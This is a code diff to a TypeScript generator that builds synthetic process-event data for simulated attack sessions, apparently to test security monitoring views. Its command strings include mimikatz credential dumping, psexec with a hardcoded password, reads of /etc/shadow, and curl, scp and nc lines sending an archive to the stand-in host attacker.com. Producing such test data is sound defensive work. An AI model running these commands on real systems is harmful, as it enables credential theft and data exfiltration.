@@ -475,6 +475,342 @@ export class SessionViewGenerator {
   getAllProcesses(): ProcessEntity[] {
     return Array.from(this.processEntities.values());
   }
+
+  /**
+   * Generate realistic attack scenario session
+   */
+  generateAttackScenario(
+    scenarioType: 'lateral_movement' | 'privilege_escalation' | 'persistence' | 'discovery' | 'data_exfiltration' = 'lateral_movement'
+  ): ProcessEntity[] {
+    const attackProcesses: ProcessEntity[] = [];
+
+    switch (scenarioType) {
+      case 'lateral_movement':
+        return this.generateLateralMovementScenario();
+      case 'privilege_escalation':
+        return this.generatePrivilegeEscalationScenario();
+      case 'persistence':
+        return this.generatePersistenceScenario();
+      case 'discovery':
+        return this.generateDiscoveryScenario();
+      case 'data_exfiltration':
+        return this.generateDataExfiltrationScenario();
+      default:
+        return this.generateLateralMovementScenario();
+    }
+  }
+
+  /**
+   * Generate lateral movement attack chain
+   */
+  private generateLateralMovementScenario(): ProcessEntity[] {
+    const processes: ProcessEntity[] = [];
+    const baseTime = Date.now();
+
+    // 1. Initial compromised shell
+    const initialShell = this.generateProcess({
+      name: 'bash',
+      executable: '/bin/bash',
+      commandLine: '/bin/bash -i',
+      isInteractive: true,
+      createNewSession: true,
+    });
+    processes.push(initialShell);
+
+    // 2. Network discovery
+    const netDiscovery = this.generateProcess({
+      name: 'nmap',
+      executable: '/usr/bin/nmap',
+      commandLine: 'nmap -sn 192.168.1.0/24',
+      parentProcess: initialShell,
+    });
+    processes.push(netDiscovery);
+
+    // 3. Credential dumping
+    const credDump = this.generateProcess({
+      name: 'mimikatz',
+      executable: '/tmp/mimikatz.exe',
+      commandLine: '/tmp/mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
+      parentProcess: initialShell,
+    });
+    processes.push(credDump);
+
+    // 4. Remote connection
+    const psexec = this.generateProcess({
+      name: 'psexec',
+      executable: '/usr/bin/psexec',
+      commandLine: 'psexec \\\\192.168.1.100 -u administrator -p password123 cmd.exe',
+      parentProcess: initialShell,
+    });
+    processes.push(psexec);
+
+    // 5. Remote shell on target
+    const remoteShell = this.generateProcess({
+      name: 'cmd',
+      executable: 'C:\\Windows\\System32\\cmd.exe',
+      commandLine: 'C:\\Windows\\System32\\cmd.exe',
+      isInteractive: true,
+      createNewSession: true,
+    });
+    processes.push(remoteShell);
+
+    return processes;
+  }
+
+  /**
+   * Generate privilege escalation scenario
+   */
+  private generatePrivilegeEscalationScenario(): ProcessEntity[] {
+    const processes: ProcessEntity[] = [];
+
+    // 1. Low-privilege shell
+    const userShell = this.generateProcess({
+      name: 'bash',
+      executable: '/bin/bash',
+      commandLine: '/bin/bash',
+      isInteractive: true,
+    });
+    processes.push(userShell);
+
+    // 2. Enumeration
+    const enumeration = this.generateProcess({
+      name: 'linpeas',
+      executable: '/tmp/linpeas.sh',
+      commandLine: '/tmp/linpeas.sh',
+      parentProcess: userShell,
+    });
+    processes.push(enumeration);
+
+    // 3. SUID exploitation
+    const suidExploit = this.generateProcess({
+      name: 'find',
+      executable: '/usr/bin/find',
+      commandLine: 'find / -perm -4000 -type f 2>/dev/null',
+      parentProcess: userShell,
+    });
+    processes.push(suidExploit);
+
+    // 4. Privilege escalation
+    const privesc = this.generateProcess({
+      name: 'sudo',
+      executable: '/usr/bin/sudo',
+      commandLine: 'sudo /bin/bash',
+      parentProcess: userShell,
+    });
+    processes.push(privesc);
+
+    // 5. Root shell
+    const rootShell = this.generateProcess({
+      name: 'bash',
+      executable: '/bin/bash',
+      commandLine: '/bin/bash',
+      isInteractive: true,
+      createNewSession: true,
+    });
+    // Override user to root
+    rootShell.user = { name: 'root', id: '0' };
+    rootShell.group = { name: 'root', id: '0' };
+    processes.push(rootShell);
+
+    return processes;
+  }
+
+  /**
+   * Generate persistence mechanism scenario
+   */
+  private generatePersistenceScenario(): ProcessEntity[] {
+    const processes: ProcessEntity[] = [];
+
+    const shell = this.generateProcess({
+      name: 'bash',
+      executable: '/bin/bash',
+      commandLine: '/bin/bash',
+      isInteractive: true,
+    });
+    processes.push(shell);
+
+    // Crontab persistence
+    const crontab = this.generateProcess({
+      name: 'crontab',
+      executable: '/usr/bin/crontab',
+      commandLine: 'crontab -e',
+      parentProcess: shell,
+    });
+    processes.push(crontab);
+
+    // SSH key persistence
+    const sshKeys = this.generateProcess({
+      name: 'ssh-keygen',
+      executable: '/usr/bin/ssh-keygen',
+      commandLine: 'ssh-keygen -t rsa -f /home/user/.ssh/id_rsa -N ""',
+      parentProcess: shell,
+    });
+    processes.push(sshKeys);
+
+    // Systemd service persistence
+    const systemctl = this.generateProcess({
+      name: 'systemctl',
+      executable: '/usr/bin/systemctl',
+      commandLine: 'systemctl enable malicious.service',
+      parentProcess: shell,
+    });
+    processes.push(systemctl);
+
+    return processes;
+  }
+
+  /**
+   * Generate discovery scenario
+   */
+  private generateDiscoveryScenario(): ProcessEntity[] {
+    const processes: ProcessEntity[] = [];
+
+    const shell = this.generateProcess({
+      name: 'bash',
+      executable: '/bin/bash',
+      isInteractive: true,
+    });
+    processes.push(shell);
+
+    const discoveryCommands = [
+      { name: 'whoami', cmd: 'whoami' },
+      { name: 'id', cmd: 'id' },
+      { name: 'ps', cmd: 'ps aux' },
+      { name: 'netstat', cmd: 'netstat -tulpn' },
+      { name: 'ss', cmd: 'ss -tulpn' },
+      { name: 'ls', cmd: 'ls -la /home' },
+      { name: 'find', cmd: 'find / -name "*.conf" 2>/dev/null' },
+      { name: 'cat', cmd: 'cat /etc/passwd' },
+      { name: 'cat', cmd: 'cat /etc/shadow' },
+      { name: 'mount', cmd: 'mount' },
+    ];
+
+    discoveryCommands.forEach(cmd => {
+      const process = this.generateProcess({
+        name: cmd.name,
+        executable: `/usr/bin/${cmd.name}`,
+        commandLine: cmd.cmd,
+        parentProcess: shell,
+      });
+      processes.push(process);
+    });
+
+    return processes;
+  }
+
+  /**
+   * Generate data exfiltration scenario
+   */
+  private generateDataExfiltrationScenario(): ProcessEntity[] {
+    const processes: ProcessEntity[] = [];
+
+    const shell = this.generateProcess({
+      name: 'bash',
+      executable: '/bin/bash',
+      isInteractive: true,
+    });
+    processes.push(shell);
+
+    // Find sensitive files
+    const findFiles = this.generateProcess({
+      name: 'find',
+      executable: '/usr/bin/find',
+      commandLine: 'find /home -name "*.pdf" -o -name "*.doc*" -o -name "*.xls*"',
+      parentProcess: shell,
+    });
+    processes.push(findFiles);
+
+    // Archive data
+    const tar = this.generateProcess({
+      name: 'tar',
+      executable: '/usr/bin/tar',
+      commandLine: 'tar -czf /tmp/data.tar.gz /home/user/Documents/',
+      parentProcess: shell,
+    });
+    processes.push(tar);
+
+    // Exfiltrate via various methods
+    const exfilMethods = [
+      { name: 'curl', cmd: 'curl -X POST -F "file=@/tmp/data.tar.gz" http://attacker.com/upload' },
+      { name: 'scp', cmd: 'scp /tmp/data.tar.gz user@attacker.com:/tmp/' },
+      { name: 'nc', cmd: 'nc attacker.com 4444 < /tmp/data.tar.gz' },
+    ];
+
+    const selectedMethod = faker.helpers.arrayElement(exfilMethods);
+    const exfil = this.generateProcess({
+      name: selectedMethod.name,
+      executable: `/usr/bin/${selectedMethod.name}`,
+      commandLine: selectedMethod.cmd,
+      parentProcess: shell,
+    });
+    processes.push(exfil);
+
+    return processes;
+  }
+
+  /**
+   * Enhanced terminal output with realistic attack progression
+   */
+  private generateEnhancedTerminalOutput(processName: string, scenarioType?: string): string {
+    const attackOutputs: Record<string, string[]> = {
+      nmap: [
+        'Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-20 14:30 UTC\n' +
+        'Nmap scan report for 192.168.1.1\n' +
+        'Host is up (0.00050s latency).\n' +
+        'Nmap scan report for 192.168.1.100\n' +
+        'Host is up (0.00023s latency).\n' +
+        'Nmap done: 256 IP addresses (12 hosts up) scanned in 2.5 seconds'
+      ],
+      mimikatz: [
+        '  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51\n' +
+        ' .## ^ ##.  "A La Vie, A L\'Amour" - (oe.eo)\n' +
+        ' ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n' +
+        ' ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n' +
+        ' \'## v ##\'                Vincent LE TOUX ( vincent.letoux@gmail.com )\n' +
+        '  \'#####\'                 > https://pingcastle.com / https://mysmartlogon.com   ***/\n\n' +
+        'mimikatz # privilege::debug\n' +
+        'Privilege \'20\' OK\n\n' +
+        'mimikatz # sekurlsa::logonpasswords\n' +
+        'Authentication Id : 0 ; 996 (00000000:000003e4)\n' +
+        'Session           : Service from 0\n' +
+        'User Name         : NETWORKSERVICE\n' +
+        'Domain            : NT AUTHORITY\n' +
+        'Logon Server      : (null)\n' +
+        ' * Username : administrator\n' +
+        ' * Domain   : WORKGROUP\n' +
+        ' * Password : P@ssw0rd123!'
+      ],
+      psexec: [
+        'PsExec v2.2 - Execute processes remotely\n' +
+        'Copyright (C) 2001-2016 Mark Russinovich\n' +
+        'Sysinternals - www.sysinternals.com\n\n' +
+        'Connecting to 192.168.1.100...\n' +
+        'Starting cmd on 192.168.1.100...\n' +
+        'cmd started on 192.168.1.100 with process ID 2856.'
+      ],
+      linpeas: [
+        '════════════════════════════════════╗\n' +
+        '══════════════════║ LINPEAS ║══════════════════\n' +
+        '════════════════════════════════════╝\n' +
+        'Linux Privilege Escalation Awesome Script\n\n' +
+        '[+] Checking if /etc/passwd is writable\n' +
+        '[+] Checking for SUID binaries\n' +
+        '/usr/bin/sudo\n' +
+        '/usr/bin/passwd\n' +
+        '/usr/bin/newgrp\n' +
+        '/usr/bin/su\n\n' +
+        '[+] Checking sudo version\n' +
+        'Sudo version 1.8.21p2'
+      ]
+    };
+
+    if (attackOutputs[processName]) {
+      return faker.helpers.arrayElement(attackOutputs[processName]);
+    }
+
+    // Fallback to original method
+    return this.generateTerminalOutput(processName);
+  }
 }
 
 // Default instance for simple usage
